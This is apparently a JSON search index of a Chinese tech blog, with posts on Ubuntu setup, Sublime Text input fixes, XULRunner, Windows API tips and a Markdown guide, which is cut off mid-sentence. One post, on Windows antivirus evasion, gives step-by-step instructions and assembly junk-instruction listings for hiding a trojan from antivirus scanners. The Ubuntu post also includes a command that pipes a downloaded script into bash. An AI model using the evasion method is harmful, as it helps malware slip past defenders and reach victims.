[{"title":"Ubuntu下sublime text 中文输入","url":"/2014/08/19/Sublime-support-chinese-input/","content":"首先安装fcitx输入法。sudo apt-get install fcitx fcitx-config-gtk fcitx-sunpinyin fcitx-googlepinyin fcitx-module-cloudpinyinsudo apt-get install fcitx-table-allsudo apt-get install im-switchim-switch -s fcitx -z default\n可以选择安装搜狗拼音输入法。下载地址  \n安装C&#x2F;C++的编译环境和gtk libgtk2.0-devsudo apt-get install build-essential libgtk2.0-dev\n\n编译sublime-imfix.c文件\n\n编译共享内库gcc -shared -o libsublime-imfix.so sublime_imfix.c `pkg-config --libs --cflags gtk+-2.0` -fPIC\n\n拷贝共享内库到程序目录sudo cp libsublime-imfix.so /opt/sublime_text/\n\n修改命令subl和启动图标修改命令sublsudo vim /usr/bin/subl\n\n将    #!&#x2F;bin&#x2F;sh    exec &#x2F;opt&#x2F;sublime_text&#x2F;sublime_text “$@”修改为    #!&#x2F;bin&#x2F;sh    LD_PRELOAD&#x3D;&#x2F;opt&#x2F;sublime_text&#x2F;libsublime-imfix.so exec &#x2F;opt&#x2F;sublime_text&#x2F;sublime_text “$@”  \n修改启动图表sudo vim /usr/share/applications/sublime-text.desktop  \n\n修改部分将[Desktop Entry]中的字符串\nExec=/opt/sublime_text/sublime_text %F  \n\n修改为  \nExec=sh -c &quot;LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text %F&quot;  \n\n将[Desktop Action Window]中的字符串\nExec=/opt/sublime_text/sublime_text -n  \n\n修改为\nExec=sh -c &quot;LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text -n&quot;\n\n将[Desktop Action Document]中的字符串  \nExec=/opt/sublime_text/sublime_text --command new_file  \n\n修改为  \nExec=sh -c &quot;LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so exec /opt/sublime_text/sublime_text --command new_file&quot;  \n\n","categories":["Linux"],"tags":["Sublime Text","中文输入"]},{"title":"Ubuntu安装配置","url":"/2014/08/19/Ubuntu-install-config/","content":"1.安装flash从flash官网下载对应的版本的压缩包。(https://www.adobe.com/support/flashplayer/downloads.html)解压文件，拷贝文件。\nsudo cp libflashplayer.so /usr/lib/mozilla/plugins/sudo cp -r ./usr/* /usr/\n\n2.安装RVMcurl -L https://get.rvm.io | bash -s stablesource ~/.rvm/scripts/rvmrvm install 2.0.0rvm use 2.0.0/bin/bash --login\n\n3.安装sublime text 3sudo add-apt-repository ppa:webupd8team/sublime-text-3sudo apt-get updatesudo apt-get install sublime-text-installer\n\n4.安装ubuntu-tweaksudo add-apt-repository ppa:tualatrix/ppasudo apt-get updatesudo apt-get install ubuntu-tweak\n\n5.生成ssh密钥ssh-keygen -t rsa -C &quot;chaosky.me@gmail.com&quot;eval &quot;$(ssh-agent -s)&quot;ssh-add ~/.ssh/id_rsasudo apt-get install xclipxclip -sel clip &lt; ~/.ssh/id_rsa.pub\n\n6.配置VPN(http://www.iqlinkus.net/help.action)\n7.安装zsh具体配置参考池老师的MacTalk的文章《终极shell》\n8.安装Ubuntu Tweak最新版本下载地址：https://launchpad.net/ubuntu-tweak/+download或使用PPA方式进行安装：  \nsudo add-apt-repository ppa:tualatrix/ppasudo apt-get updatesudo apt-get install ubuntu-tweak\n\n9.安装星际译王主页：http://stardict-4.sourceforge.net/终端安装：$ sudo apt-get install stardict安装词典：http://abloz.com/huzheng/stardict-dic/下载词典并解压到 ~&#x2F;.stardict&#x2F;dic 或 &#x2F;usr&#x2F;share&#x2F;stardict&#x2F;dic现在以安装文件名为stardict-zh-en.tar.bz2 的词典为例：  \ntar -xjvf stardict-zh-en.tar.bz2sudo mv stardict-zh-en /usr/share/stardict/dic\n注意：stardict-zh-en.tar.bz2是词典文件，stardict-zh-en 是解压出来的词典目录重新启动stardict，新的词典就会被自动加载了。安装真人语音库：WyabdcRealPeopleTTS.tar.bz2sudo tar -xvf WyabdcRealPeopleTTS.tar.bz2 -C /usr/share\n","categories":["Linux"],"tags":["Ubuntu","装机"]},{"title":"Windows程序免杀的分析","url":"/2014/09/03/Windows-app-antivirus/","content":"最近公司开发的Windows软件总是被360检出病毒，特别恼火。总结了几种方法。  \n1. 程序数字签名基本上在第一轮和杀毒软件的PK中绝大多数是会通过的，但是在程序中包含特征码那另当别论，杀毒软件立即会报毒。  \n2. 编译器选项在VC++里有#pragma code_seg(&quot;PAGE&quot;)&#x2F;&#x2F;其中PAGE是区段的名称。这个是免杀中最有用的一个编译器选项，它可以把cpp文件里的代码放到一个单独的区段里，这样在对付杀毒软件的代码查杀的时候，给我们带来了非常大的方便。\n3. VC++ 源代码中加入汇编语句__asm&#123;\tnop //汇编指令\tnop\tnop\tnop&#125;\n\n4. 加花指令花指令：其实是一段垃圾代码，和一些乱跳转，但并不影响程序的正常运行。加了花指令后，使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。\n加花指令制作过程详解\n第一步：配置一个不加壳的木马程序。  \n第二步：用OD载入这个木马程序，同时记下入口点的内存地址。  \n第三步：向下拉滚动条，找到零区域（也就是可以插入代码的都是0的空白地方）。并记下零区域的起始内存地址。  \n第四步：从这个零区域的起始地址开始一句一句的写入我们准备好的花指令代码。  \n第五步：花指令写完后，在花指令的结束位置加一句：JMP　刚才OD载入时的入口点内存地址。  \n第六步：保存修改结果后，最后用PEditor这款工具打开这个改过后的木马程序。在入口点处把原来的入口地址改成刚才记下的零区域的起始内存地址，并按应用更改。使更改生效。\n\n加花指令免杀技术总结优点：通用性非常不错，一般一个木马程序加入花指令后，就可以躲大部分的杀毒软件，不像改特征码，只能躲过某一种杀毒软件。\n缺点：这种方法还是不能过具有内存查杀的杀毒软件，比如瑞星内存查杀等。\n以后将加花指令与改入口点，加壳，改特征码这几种方法结合起来混合使用效果将非常不错。\n加花指令免杀要点由于黑客网站公布的花指令过不了一段时间就会被杀软辨认出来，所以需要你自己去搜集一些不常用的花指令，另外目前还有几款软件可以自动帮你加花，方便一些不熟悉的朋友，例如花指令添加器等。\n\n\n常见花指令代码1. VC++ 5.0PUSH EBPMOV EBP,ESPPUSH -1push 515448PUSH 6021A8MOV EAX,DWORD PTR FS:[0]PUSH EAXMOV DWORD PTR FS:[0],ESPADD ESP,-6CPUSH EBXPUSH ESIPUSH EDIjmp 跳转到程序原来的入口点\n2. C++push ebpmov ebp,esppush -1push 111111push 222222mov eax,fs:[0]push eaxmov fs:[0],esppop eaxmov fs:[0],eaxpop eaxpop eaxpop eaxpop eaxmov ebp,eaxjmp 跳转到程序原来的入口点\n3. 跳转somewhere:      nop                    /&quot;胡乱&quot;跳转的开始...      jmp 下一个jmp的地址    /在附近随意跳      jmp ...                /...      jmp 原入口的地址      /跳到原始oep新入口: push ebp        mov ebp,esp        inc ecx        push edx        nop        pop edx        dec ecx        pop ebp        inc ecx        loop somewhere        /跳转到上面那段代码地址去！\n4. Microsoft Visual C++ 6.0push ebpmov ebp,espPUSH -1PUSH 0PUSH 0MOV EAX,DWORD PTR FS:[0]PUSH EAXMOV DWORD PTR FS:[0],ESPSUB ESP,68PUSH EBXPUSH ESIPUSH EDIPOP EAXPOP EAXPOP EAXADD ESP,68POP EAXMOV DWORD PTR FS:[0],EAXPOP EAXPOP EAXPOP EAXPOP EAXMOV EBP,EAXJMP 原入口\n5.在mov ebp,eax后面加上PUSH EAX POP EAX6.push ebpmov ebp,espadd esp,-0Cadd esp,0Cmov eax,403D7Dpush eaxretnpush ebpmov ebp,esppush -1push 00411222push 00411544mov eax,dword ptr fs:[0]push eaxmov dword ptr fs:[0],espadd esp,-6Cpush ebxpush esipush ediadd byte ptr ds:[eax],aljo 入口jno 入口call 下一地址\n7.push ebpnopnopmov ebp,espinc ecxnoppush edxnopnoppop edxnoppop ebpinc ecxloop 任意地址nopnopnopnopjmp 下一个jmp的地址    /在附近随意跳nopjmp 下一个jmp的地址    /在附近随意跳nopjmp 下一个jmp的地址    /在附近随意跳jmp 入口\n\n\n","categories":["Windows"],"tags":["Antivirus","Windows"]},{"title":"XULRunner桌面应用解决方案","url":"/2014/09/10/XULRunner-app-solution/","content":"XULRunner 可以通过运用 Web 开发技术构建桌面应用程序。它提供了丰富的 UI 部件集，使用 XUL，可以直接与 HTML 混合使用并可大量使用 JavaScript。  \n基本概念XULRunnerXULRunner是Mozilla运行包，可以启动类似Firefox和Tunderbird这样多功能的XUL+XPCOM结合的程序。它为程序提供安装、升级、删除机制。 XULRunner还会提供libxul, 它允许其它项目或产品嵌入使用谋智(Mozilla)技术。\nXULXUL是一个Mozilla使用XML来描述用户界面的一种技术，使用XUL你可以快速的创建出跨平台，基于因特网的应用程序。基于XUL技术的应用程序可以很方便的使用好看的字体、图形以及方便的界面布局，而且也更容易部署和定制。如果程序员已经熟悉了Dynamic HTML (DHTML)，那学习XUL将是更容易的事，也可以更快的开发基于XUL的应用程序。\nXPCOMXPCOM（Cross Platform Component Object Model）是一种跨平台组件对象模型，其原理与微软的COM技术类似，它支持多种语言绑定（Language Bindings）。也就是说，我们可以使用C++、JAVA、JavaScript、Python、Ruby、Perl等语言来编写组件。而XPCOM的接口是用一种叫做XPIDL的IDL（Interface Description Language）来定义的。XPCOM 本身提供了一套核心的组件和类，用于诸如内存管理，线程，基本数据结构（strings, arrays, variants）等 。但是大部分的XPCOM组件并不是这个核心库提供的，而是由很多第三方的平台（例如Gecko或者Necko）提供，或者由一个应用，甚至一个扩展提供。  \n应用程序目录结构XULRunner应用、扩展和主题都共享相同的目录结构，并且这样的目录结构某些时候还可以用于像可安装应用扩展那样的独立XULRunner应用。\n","categories":["Windows"],"tags":["XULRunner","XUL"]},{"title":"VC++技巧","url":"/2014/10/11/VC-tips/","content":"Windows APIFindWindow\n函数功能：该函数获得一个顶层窗口的句柄，该窗口的类名和窗口名与给定的字符串相匹配。这个函数不查找子窗口。在查找时不区分大小写。  \n函数原型：HWND FindWindow（LPCTSTR IpClassName，LPCTSTR IpWindowName）;\n参数：IpClassName：指向一个指定了类名的空结束字符串，或一个标识类名字符串的成员的指针。如果该参数为一个成员，则它必须为前次调用theGlobafAddAtom函数产生的全局成员。该成员为16位，必须位于IpClassName的低 16位，高位必须为 0。IpWindowName：指向一个指定了窗口名（窗口标题）的空结束字符串。如果该参数为空，则为所有窗口全匹配。  \n返回值：如果函数成功，返回值为具有指定类名和窗口名的窗口句柄；如果函数失败，返回值为NULL。这个函数有两个参数，第一个是要找的窗口的类，第二个是要找的窗口的标题。在搜索的时候不一定两者都知道，但至少要知道其中的一个。有的窗口的标题是比较容易得到的，如”计算器”，所以搜索时应使用标题进行搜索。但有的软件的标题不是固定的，如”记事本”，如果打开的文件不同，窗口标题也不同，这时使用窗口类搜索就比较方便。如果找到了满足条件的窗口，这个函数返回该窗口的句柄，否则返回0。也可以通过SendMessage(hwnd, WM_CLOSE, NULL, NULL);来关闭窗口。\n\nGetWindowThreadProcessId\n函数功能：在得到窗口句柄后我们可以通过GetWindowThreadProcessId这个函数来获得窗口所属进程ID和线程ID，从而判断创建窗口的进程和线程。\n函数原型：DWORD GetWindowThreadProcessId(HWND hWnd,LPDWORD lpdwProcessId);\n参数：hWnd：传入的窗口句柄；lpdwProcessId：返回的进程ID地址。\n返回值：函数返回的是窗口所属线程ID。这个函数可以结合FindWindow共同使用。通过FindWindow查找窗口句柄。\n\n","categories":["Windows"],"tags":["Tips"]},{"title":"Markdown语法说明","url":"/2014/10/11/Markdown-syntax/","content":"基本用法行尾2空格 + 1回车 &#x3D; 换行连续2回车 &#x3D; 空行分段*斜体***粗体**4空格 &#x3D; 代码块&gt; &#x3D; 引用-,*,+ &#x3D; 无序列表1. &#x3D; 有序列表&lt;http://foo.com&gt;  &#x3D; 链接网址[文字](http://url) &#x3D; 链接文字![说明](http://imgurl) &#x3D; 图片  \n\n详细用法声明： 这份文档派生(fork)于繁体中文版，在此基础上进行了繁体转简体工作，并进行了适当的润色。此文档用 Markdown 语法编写，你可以到这里查看它的源文件。「繁体中文版的原始文件可以查看这里 。」–By @riku\n注： 本项目托管于 GitCafe上，请通过”派生”和”合并请求”来帮忙改进本项目。\nMarkdown 语法说明 (简体中文版) &#x2F; (点击查看快速入门)\n概述\n宗旨\n兼容 HTML\n特殊字符自动转换\n\n\n区块元素\n段落和换行\n标题\n区块引用\n列表\n代码区块\n分隔线\n\n\n区段元素\n链接\n强调\n代码\n图片\n\n\n其它\n反斜杠\n自动链接\n\n\n感谢\n   Markdown 免费编辑器\n\n\n概述\n\n宗旨\n\nMarkdown 的目标是实现「易读易写」。\n可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 [Setext] 1、[atx] 2、[Textile] 3、[reStructuredText] 4、[Grutatext] 5 和 [EtText] 6，而最大灵感来源其实是纯文本电子邮件的格式。\n总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像*强调*。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。\n兼容 HTML\n\nMarkdown 语法的目标是：成为一种适用于网络的书写语言。\nMarkdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想不是要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种发布的格式，Markdown 是一种书写的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。\n不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。\n要制约的只有一些 HTML 区块元素――比如 &lt;div&gt;、&lt;table&gt;、&lt;pre&gt;、&lt;p&gt; 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 &lt;p&gt; 标签。\n例子如下，在 Markdown 文件里加上一段 HTML 表格：\n这是一个普通段落。\n\n&lt;table&gt;\n    &lt;tr&gt;\n        &lt;td&gt;Foo&lt;/td&gt;\n    &lt;/tr&gt;\n&lt;/table&gt;\n\n这是另一个普通段落。\n\n请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的*强调*会没有效果。\nHTML 的区段（行内）标签如 &lt;span&gt;、&lt;cite&gt;、&lt;del&gt; 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的 &lt;a&gt; 或 &lt;img&gt; 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。\n和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。\n特殊字符自动转换\n\n在 HTML 文件中，有两个字符需要特殊处理： &lt; 和 &amp; 。 &lt; 符号用于起始标签，&amp; 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 &amp;lt; 和 &amp;amp;。\n&amp; 字符尤其让网络文档编写者受折磨，如果你要打「AT&amp;T」 ，你必须要写成「AT&amp;amp;T」。而网址中的 &amp; 字符也要转换。比如你要链接到：\nhttp://images.google.com/images?num=30&amp;q=larry+bird\n\n你必须要把网址转换写为：\nhttp://images.google.com/images?num=30&amp;amp;q=larry+bird\n\n才能放到链接标签的 href 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。\nMarkdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的 &amp; 字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 &amp;amp;。\n所以你如果要在文档中插入一个版权符号 ©，你可以这样写：\n&amp;copy;\n\nMarkdown 会保留它不动。而若你写：\nAT&amp;T\n\nMarkdown 就会将它转为：\nAT&amp;amp;T\n\n类似的状况也会发生在 &lt; 符号上，因为 Markdown 允许 兼容 HTML ，如果你是把 &lt; 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：\n4 &lt; 5\n\nMarkdown 将会把它转换为：\n4 &amp;lt; 5\n\n不过需要注意的是，code 范围内，不论是行内还是区块， &lt; 和 &amp; 两个符号都一定会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 &lt; 和 &amp; 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）\n\n区块元素\n\n\n段落和换行\n\n一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。\n「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成 &lt;br /&gt; 标签。\n如果你确实想要依赖 Markdown 来插入 &lt;br /&gt; 标签的话，在插入处先按入两个以上的空格然后回车。\n的确，需要多费点事（多加空格）来产生 &lt;br /&gt; ，但是简单地「每个换行都转换为 &lt;br /&gt;」的方法在 Markdown 中并不适合， Markdown 中 email 式的 区块引用 和多段落的 列表 在使用换行来排版的时候，不但更好用，还更方便阅读。\n标题\n\nMarkdown 支持两种标题的语法，类 [Setext] 1 和类 [atx] 2 形式。\n类 Setext 形式是用底线的形式，利用 = （最高阶标题）和 - （第二阶标题），例如：\nThis is an H1\n=============\n\nThis is an H2\n-------------\n\n任何数量的 = 和 - 都可以有效果。\n类 Atx 形式则是在行首插入 1 到 6 个 # ，对应到标题 1 到 6 阶，例如：\n# 这是 H1\n\n## 这是 H2\n\n###### 这是 H6\n\n你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 #，而行尾的 # 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：\n# 这是 H1 #\n\n## 这是 H2 ##\n\n### 这是 H3 ######\n\n区块引用 Blockquotes\n\nMarkdown 标记区块引用是使用类似 email 中用 &gt; 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 &gt; ：\n&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\n&gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\n&gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n&gt;\n&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\n&gt; id sem consectetuer libero luctus adipiscing.\n\nMarkdown 也允许你偷懒只在整个段落的第一行最前面加上 &gt; ：\n&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,\nconsectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.\nVestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.\n\n&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse\nid sem consectetuer libero luctus adipiscing.\n\n区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 &gt; ：\n&gt; This is the first level of quoting.\n&gt;\n&gt; &gt; This is nested blockquote.\n&gt;\n&gt; Back to the first level.\n\n引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：\n&gt; ## 这是一个标题。\n&gt;\n&gt; 1.   这是第一行列表项。\n&gt; 2.   这是第二行列表项。\n&gt;\n&gt; 给出一些例子代码：\n&gt;\n&gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);\n\n任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择增加引用阶层。\n列表\n\nMarkdown 支持有序列表和无序列表。\n无序列表使用星号、加号或是减号作为列表标记：\n*   Red\n*   Green\n*   Blue\n\n等同于：\n+   Red\n+   Green\n+   Blue\n\n也等同于：\n-   Red\n-   Green\n-   Blue\n\n有序列表则使用数字接着一个英文句点：\n1.  Bird\n2.  McHale\n3.  Parish\n\n很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：\n&lt;ol&gt;\n&lt;li&gt;Bird&lt;/li&gt;\n&lt;li&gt;McHale&lt;/li&gt;\n&lt;li&gt;Parish&lt;/li&gt;\n&lt;/ol&gt;\n\n如果你的列表标记写成：\n1.  Bird\n1.  McHale\n1.  Parish\n\n或甚至是：\n3. Bird\n1. McHale\n8. Parish\n\n你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。\n如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。\n列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。\n要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：\n*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.\n    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,\n    viverra nec, fringilla in, laoreet vitae, risus.\n*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.\n    Suspendisse id sem consectetuer libero luctus adipiscing.\n\n但是如果你懒，那也行：\n*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.\nAliquam hendrerit mi posuere lectus. Vestibulum enim wisi,\nviverra nec, fringilla in, laoreet vitae, risus.\n*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.\nSuspendisse id sem consectetuer libero luctus adipiscing.\n\n如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 &lt;p&gt;标签包起来，举例来说：\n*   Bird\n*   Magic\n\n会被转换为：\n&lt;ul&gt;\n&lt;li&gt;Bird&lt;/li&gt;\n&lt;li&gt;Magic&lt;/li&gt;\n&lt;/ul&gt;\n\n但是这个：\n*   Bird\n\n*   Magic\n\n会被转换为：\n&lt;ul&gt;\n&lt;li&gt;&lt;p&gt;Bird&lt;/p&gt;&lt;/li&gt;\n&lt;li&gt;&lt;p&gt;Magic&lt;/p&gt;&lt;/li&gt;\n&lt;/ul&gt;\n\n列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：\n1.  This is a list item with two paragraphs. Lorem ipsum dolor\n    sit amet, consectetuer adipiscing elit. Aliquam hendrerit\n    mi posuere lectus.\n\n    Vestibulum enim wisi, viverra nec, fringilla in, laoreet\n    vitae, risus. Donec sit amet nisl. Aliquam semper ipsum\n    sit amet velit.\n\n2.  Suspendisse id sem consectetuer libero luctus adipiscing.\n\n如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：\n*   This is a list item with two paragraphs.\n\n    This is the second paragraph in the list item. You&#39;re\nonly required to indent the first line. Lorem ipsum dolor\nsit amet, consectetuer adipiscing elit.\n\n*   Another item in the same list.\n\n如果要在列表项目内放进引用，那 &gt; 就需要缩进：\n*   A list item with a blockquote:\n\n    &gt; This is a blockquote\n    &gt; inside a list item.\n\n如果要放代码区块的话，该区块就需要缩进两次，也就是 8 个空格或是 2 个制表符：\n*   一列表项包含一个列表区块：\n\n        &lt;代码写在这&gt;\n\n当然，项目列表很可能会不小心产生，像是下面这样的写法：\n1986. What a great season.\n\n换句话说，也就是在行首出现数字-句点-空白，要避免这样的状况，你可以在句点前面加上反斜杠。\n1986\\. What a great season.\n\n代码区块\n\n和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 &lt;pre&gt; 和 &lt;code&gt; 标签来把代码区块包起来。\n要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：\n这是一个普通段落：\n\n    这是一个代码区块。\n\nMarkdown 会转换成：\n&lt;p&gt;这是一个普通段落：&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;这是一个代码区块。\n&lt;/code&gt;&lt;/pre&gt;\n\n这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：\nHere is an example of AppleScript:\n\n    tell application &quot;Foo&quot;\n        beep\n    end tell\n\n会被转换为：\n&lt;p&gt;Here is an example of AppleScript:&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;tell application &quot;Foo&quot;\n    beep\nend tell\n&lt;/code&gt;&lt;/pre&gt;\n\n一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。\n在代码区块里面， &amp; 、 &lt; 和 &gt; 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：\n    &lt;div class=&quot;footer&quot;&gt;\n        &amp;copy; 2004 Foo Corporation\n    &lt;/div&gt;\n\n会被转换为：\n&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&quot;footer&quot;&amp;gt;\n    &amp;amp;copy; 2004 Foo Corporation\n&amp;lt;/div&amp;gt;\n&lt;/code&gt;&lt;/pre&gt;\n\n代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。\n分隔线\n\n你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：\n* * *\n\n***\n\n*****\n\n- - -\n\n---------------------------------------\n\n\n区段元素\n\n链接\n\nMarkdown 支持两种形式的链接语法： 行内式和参考式两种形式。\n不管是哪一种，链接文字都是用 [方括号] 来标记。\n要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：\nThis is [an example](http://example.com/ &quot;Title&quot;) inline link.\n\n[This link](http://example.net/) has no title attribute.\n\n会产生：\n&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;\nan example&lt;/a&gt; inline link.&lt;/p&gt;\n\n&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has no\ntitle attribute.&lt;/p&gt;\n\n如果你是要链接到同样主机的资源，你可以使用相对路径：\nSee my [About](/about/) page for details.\n\n参考式的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：\nThis is [an example][id] reference-style link.\n\n你也可以选择性地在两个方括号中间加上一个空格：\nThis is [an example] [id] reference-style link.\n\n接着，在文件的任意处，你可以把这个标记的链接内容定义出来：\n[id]: http://example.com/  &quot;Optional Title Here&quot;\n\n链接内容定义的形式为：\n\n方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字\n接着一个冒号\n接着一个以上的空格或制表符\n接着链接的网址\n选择性地接着 title 内容，可以用单引号、双引号或是括弧包着\n\n下面这三种链接的定义都是相同：\n[foo]: http://example.com/  &quot;Optional Title Here&quot;\n[foo]: http://example.com/  &#39;Optional Title Here&#39;\n[foo]: http://example.com/  (Optional Title Here)\n\n**请注意：**有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。\n链接网址也可以用尖括号包起来：\n[id]: &lt;http://example.com/&gt;  &quot;Optional Title Here&quot;\n\n你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：\n[id]: http://example.com/longish/path/to/resource/here\n    &quot;Optional Title Here&quot;\n\n网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。\n链接辨别标签可以有字母、数字、空白和标点符号，但是并不区分大小写，因此下面两个链接是一样的：\n[link text][a]\n[link text][A]\n\n隐式链接标记功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 “Google” 链接到 google.com，你可以简化成：\n[Google][]\n\n然后定义链接内容：\n[Google]: http://google.com/\n\n由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：\nVisit [Daring Fireball][] for more information.\n\n然后接着定义链接：\n[Daring Fireball]: http://daringfireball.net/\n\n链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。\n下面是一个参考式链接的范例：\nI get 10 times more traffic from [Google] [1] than from\n[Yahoo] [2] or [MSN] [3].\n\n  [1]: http://google.com/        &quot;Google&quot;\n  [2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;\n  [3]: http://search.msn.com/    &quot;MSN Search&quot;\n\n如果改成用链接名称的方式写：\nI get 10 times more traffic from [Google][] than from\n[Yahoo][] or [MSN][].\n\n  [google]: http://google.com/        &quot;Google&quot;\n  [yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;\n  [msn]:    http://search.msn.com/    &quot;MSN Search&quot;\n\n上面两种写法都会产生下面的 HTML。\n&lt;p&gt;I get 10 times more traffic from &lt;a href=&quot;http://google.com/&quot;\ntitle=&quot;Google&quot;&gt;Google&lt;/a&gt; than from\n&lt;a href=&quot;http://search.yahoo.com/&quot; title=&quot;Yahoo Search&quot;&gt;Yahoo&lt;/a&gt;\nor &lt;a href=&quot;http://search.msn.com/&quot; title=&quot;MSN Search&quot;&gt;MSN&lt;/a&gt;.&lt;/p&gt;\n\n下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：\nI get 10 times more traffic from [Google](http://google.com/ &quot;Google&quot;)\nthan from [Yahoo](http://search.yahoo.com/ &quot;Yahoo 